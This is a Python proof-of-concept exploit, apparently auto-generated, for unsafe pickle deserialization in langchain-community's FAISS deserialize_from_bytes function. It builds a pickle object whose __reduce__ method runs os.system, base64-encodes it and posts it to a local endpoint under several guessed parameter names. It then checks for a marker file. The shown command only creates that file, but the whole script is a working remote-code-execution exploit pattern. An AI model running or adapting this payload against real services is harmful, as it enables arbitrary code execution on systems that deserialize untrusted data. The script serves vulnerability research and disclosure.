#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-015
# Sink: deserialize_from_bytes
# Auto-generated — run with: python3 rce_function_deserialize_bytes_directly_deserialize_from_bytes_4.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for unsafe pickle deserialization in
langchain-community's FAISS vectorstore deserialize_from_bytes function.

Vulnerability: The function calls pickle.loads(serialized) without any
validation, allowing arbitrary code execution during deserialization.

This PoC demonstrates the vulnerability by creating a malicious pickle
payload that executes a benign command (creates a marker file).
"""

import pickle
import os
import sys
import base64
import requests
import argparse
import time

# =============================================================================
# Configuration - modify these as needed
# =============================================================================
TARGET_URL = "http://localhost:8000/api/v1/trigger"
MARKER_FILE = "/tmp/poc_success.txt"

# =============================================================================
# Malicious pickle payload generation
# =============================================================================
class MaliciousPickle:
    """Class that executes a command when unpickled."""
    def __reduce__(self):
        # Benign payload: create a marker file
        cmd = f"touch {MARKER_FILE}"
        return (os.system, (cmd,))

def create_malicious_payload():
    """Create a malicious pickle payload that executes a benign command."""
    payload = pickle.dumps(MaliciousPickle())
    # Base64 encode for safe transport in HTTP requests
    return base64.b64encode(payload).decode('utf-8')

# =============================================================================
# Exploit execution
# =============================================================================
def exploit(target_url, payload_b64):
    """
    Send the malicious payload to the vulnerable endpoint.
    
    The payload is sent as the 'serialized' parameter which gets passed
    directly to deserialize_from_bytes -> pickle.loads().
    """
    print(f"[*] Target URL: {target_url}")
    print(f"[*] Payload (base64): {payload_b64[:50]}...")
    
    # Prepare the request - the exact parameter name depends on the API
    # Based on the code, the parameter is likely 'serialized' or 'data'
    # We'll try multiple common parameter names
    params = {
        "serialized": payload_b64,
        "data": payload_b64,
        "input": payload_b64
    }
    
    for param_name, param_value in params.items():
        try:
            print(f"\n[*] Trying parameter: {param_name}")
            response = requests.post(
                target_url,
                json={param_name: param_value},
                timeout=10,
                headers={"Content-Type": "application/json"}
            )
            
            print(f"[*] Response status: {response.status_code}")
            print(f"[*] Response body: {response.text[:200]}")
            
            # Check if the marker file was created
            if os.path.exists(MARKER_FILE):
                print(f"\n[+] SUCCESS! Marker file created: {MARKER_FILE}")
                print("[+] The vulnerability is exploitable!")
                return True
                
        except requests.exceptions.ConnectionError:
            print(f"[-] Connection error to {target_url}")
        except requests.exceptions.Timeout:
            print(f"[-] Request timed out")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # If we got here, check if marker file exists anyway
    if os.path.exists(MARKER_FILE):
        print(f"\n[+] SUCCESS! Marker file created: {MARKER_FILE}")
        print("[+] The vulnerability is exploitable!")
        return True
    
    print("\n[-] Exploit may not have worked - check target and payload")
    return False

# =============================================================================
# Main execution
# =============================================================================
def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community pickle deserialization RCE"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target URL (default: {TARGET_URL})"
    )
    parser.add_argument(
        "--marker",
        default=MARKER_FILE,
        help=f"Marker file to create (default: {MARKER_FILE})"
    )
    parser.add_argument(
        "--cleanup",
        action="store_true",
        help="Remove marker file if it exists"
    )
    
    args = parser.parse_args()
    
    if args.cleanup:
        if os.path.exists(args.marker):
            os.remove(args.marker)
            print(f"[*] Removed marker file: {args.marker}")
        return
    
    # Create malicious payload
    print("[*] Creating malicious pickle payload...")
    payload_b64 = create_malicious_payload()
    
    # Execute exploit
    success = exploit(args.target, payload_b64)
    
    # Cleanup marker file
    if os.path.exists(args.marker):
        os.remove(args.marker)
        print(f"[*] Cleaned up marker file: {args.marker}")
    
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
